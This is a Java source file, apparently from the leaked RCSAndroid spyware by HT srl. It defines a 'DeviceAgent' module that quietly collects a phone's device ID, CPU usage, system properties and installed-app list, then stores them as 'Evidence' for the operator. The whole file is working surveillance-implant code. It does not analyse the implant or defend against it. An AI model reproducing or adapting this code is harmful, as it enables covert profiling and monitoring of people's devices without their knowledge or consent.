/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Map.Entry;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.util.Log;

import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Evidence;
import com.ht.RCSAndroidGUI.RCSAndroidGUI;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.utils.Utils;
import com.ht.RCSAndroidGUI.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 * 
 */
public class DeviceAgent extends AgentBase {
	
	public static final String TAG = "DeviceAgent";

	/** The process list. */
	private int processList;
	
	/** The cpu usage. */
	private float cpuUsage;
	
	/** The cpu total. */
	private long cpuTotal;
	
	/** The cpu idle. */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public DeviceAgent() {
		Log.d("RCS", "DeviceAgent constructor");
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
	 */
	public void parse(final byte[] conf) {
		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);

		this.processList = myConf.getInt();
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
	 */
	public void begin() {
		setPeriod(NEVER);
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	public void go() {

		// OS Version etc...
		Log.d("RCS", "Android");

		final Runtime runtime = Runtime.getRuntime();
		final Properties properties = System.getProperties();
		readCpuUsage();

		final StringBuffer sb = new StringBuffer();

		// #ifdef DEBUG
		sb.append("Debug\n");
		// #endif

		sb.append("-- SYSTEM --\r\n");
		sb.append("Id: " + Device.self().getDeviceId() + "\n");
		sb.append("cpuUsage: " + cpuUsage + "\n");
		sb.append("cpuTotal: " + cpuTotal + "\n");
		sb.append("cpuIdle: " + cpuIdle + "\n");

		sb.append("-- PROPERTIES --\r\n");
		final Iterator<Entry<Object, Object>> it = properties.entrySet()
				.iterator();
		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n");
		}

		if (processList == 1) {
			 ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
			    final int max = apps.size();
			    for (int i=0; i<max; i++) {
			    	sb.append(apps.get(i) + "\n");
			        
			    }
		}

		final String content = sb.toString();

		// LogR log = new LogR(Agent.AGENT_DEVICE, LogR.LOG_PRI_STD);
		// log.write(WChar.getBytes(content, true));
		// log.close();

		final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
		evidence.atomicWriteOnce(WChar.getBytes(content, true));

	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(
					new InputStreamReader(new FileInputStream("/proc/stat")),
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" ");

			final long currTotal = Long.parseLong(toks[2])
					+ Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal
					- cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
	 */
	public void end() {

	}
	
	class PInfo {
	    private String appname = "";
	    private String pname = "";
	    private String versionName = "";
	    private int versionCode = 0;
	    private Drawable icon;
	    public String toString() {
	        return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode;
	    }

	}

	private ArrayList<PInfo> getPackages() {
	    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
	    final int max = apps.size();
	    for (int i=0; i<max; i++) {
	        Log.i(TAG,apps.get(i).toString());
	    }
	    return apps;
	}

	private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
	    ArrayList<PInfo> res = new ArrayList<PInfo>();   
	    PackageManager packageManager = Status.getAppContext().getPackageManager();
	    
	    List<PackageInfo> packs = packageManager.getInstalledPackages(0);
	    for(int i=0;i<packs.size();i++) {
	        PackageInfo p = packs.get(i);
	        if ((!getSysPackages) && (p.versionName == null)) {
	            continue ;
	        }
	        PInfo newInfo = new PInfo();
	        newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
	        newInfo.pname = p.packageName;
	        newInfo.versionName = p.versionName;
	        newInfo.versionCode = p.versionCode;
	        newInfo.icon = p.applicationInfo.loadIcon(packageManager);
	        res.add(newInfo);
	    }
	    return res; 
	}
}
